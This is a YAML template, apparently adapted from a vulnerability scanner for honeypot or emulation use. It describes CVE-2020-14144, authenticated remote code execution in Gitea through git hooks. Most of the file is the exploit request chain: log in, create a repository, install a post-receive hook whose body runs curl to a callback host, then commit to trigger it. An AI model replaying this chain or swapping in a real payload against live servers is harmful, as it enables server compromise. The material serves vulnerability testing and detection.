id: CVE-2020-14144
info:
  name: Gitea 1.1.0 - 1.12.5 - Remote Code Execution
  author: theamanrawat
  description: 'Gitea 1.1.0 through 1.12.5 is susceptible to authenticated remote
    code execution, via the git hook functionality, in customer environments where
    the documentation is not understood (e.g., one viewpoint is that the dangerousness
    of this feature should be documented immediately above the ENABLE_GIT_HOOKS line
    in the config file). NOTE: The vendor has indicated this is not a vulnerability
    and states "This is a functionality of the software that is limited to a subset
    of accounts. If you give someone the privilege to execute arbitrary code on your
    server, they can execute arbitrary code on your server. We provide very clear
    warnings to users around this functionality and what it provides."

    '
  severity: high
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the target system.

    '
  remediation: Fixed in version 1.16.7.
  reference:
  - https://dl.gitea.io/gitea/1.16.6
  - https://github.com/go-gitea/gitea/pull/13058
  - https://www.fzi.de/en/news/news/detail-en/artikel/fsa-2020-3-schwachstelle-in-gitea-1125-und-gogs-0122-ermoeglicht-ausfuehrung-von-code-nach-authent/
  - https://nvd.nist.gov/vuln/detail/CVE-2020-14144
  - https://docs.github.com/en/enterprise-server@2.19/admin/policies/creating-a-pre-receive-hook-script
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 7.2
    cve-id: CVE-2020-14144
    cwe-id: CWE-78
    epss-score: 0.97181
    epss-percentile: 0.99775
    cpe: cpe:2.3:a:gitea:gitea:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 7
    vendor: gitea
    product: gitea
    shodan-query: html:"Powered by Gitea Version"
  tags: cve2020,cve,rce,gitea,authenticated,git,intrusive
traps:
- request:
    method: GET
    path: /user/login
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: 'Gitea:'
- request:
    method: POST
    path: /user/login
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: '_csrf={{csrf}}&user_name={{username}}&password={{url_encode(password)}}

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /repo/create
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /repo/create
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: '_csrf={{auth_csrf}}&uid=1&repo_name={{randstr}}&private=on&description=&repo_template=&issue_labels=&gitignores=&license=&readme=Default&auto_init=on&default_branch=master

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: ///settings/hooks/git/post-receive
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: '_csrf={{auth_csrf}}&content=%23%21%2Fbin%2Fbash%0D%0Acurl+{{interactsh-url}}

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: ///_new/master
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: ///_new/master
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: '_csrf={{auth_csrf}}&last_commit={{last_commit}}&tree_path=test.txt&content=test&commit_summary=&commit_message=&commit_choice=direct

      '
  response:
    status_code: 200
    headers: {}
    body: ''
